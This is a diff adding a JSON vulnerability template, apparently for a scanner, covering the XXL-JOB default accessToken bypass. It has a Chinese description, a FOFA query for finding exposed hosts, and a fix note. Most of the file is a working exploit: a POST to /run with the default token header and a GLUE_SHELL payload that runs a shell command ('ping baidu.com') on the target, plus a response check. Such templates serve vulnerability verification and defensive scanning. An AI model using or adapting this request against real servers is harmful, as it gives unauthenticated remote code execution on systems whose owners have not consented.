@@ -1,0 +1,53 @@
+{
+  "product": "xxl-job",
+  "vul_name": "xxl-job 默认accessToken身份绕过",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。",
+  "version": "使用XXL-JOB默认AccessToken的所有版本",
+  "note": "",
+  "search": {
+    "FOFA": "\"invalid request, HttpMethod not support\" && port=\"9999\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/xuandaoren/article/details/134308795",
+  "fix": [
+    "官方已修复该漏洞，建议用户修改调度中心和执行器配置项 xxl.job.accessToken 的默认值。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/run",
+      "header": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "XXL-JOB-ACCESS-TOKEN": "default_token"
+      },
+      "json": {
+        "jobId": 1,
+        "executorHandler": "demoJobHandler",
+        "executorParams": "demoJobHandler",
+        "executorBlockStrategy": "SERIAL_EXECUTION",
+        "executorTimeout": 0,
+        "logId": 1,
+        "logDateTime": 1586373637819,
+        "glueType": "GLUE_SHELL",
+        "glueSource": "ping baidu.com",
+        "glueUpdatetime": 1586693836766,
+        "broadcastIndex": 0,
+        "broadcastTotal": 0
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": ":200}"
+        }
+      ]
+    }
+  }
+}
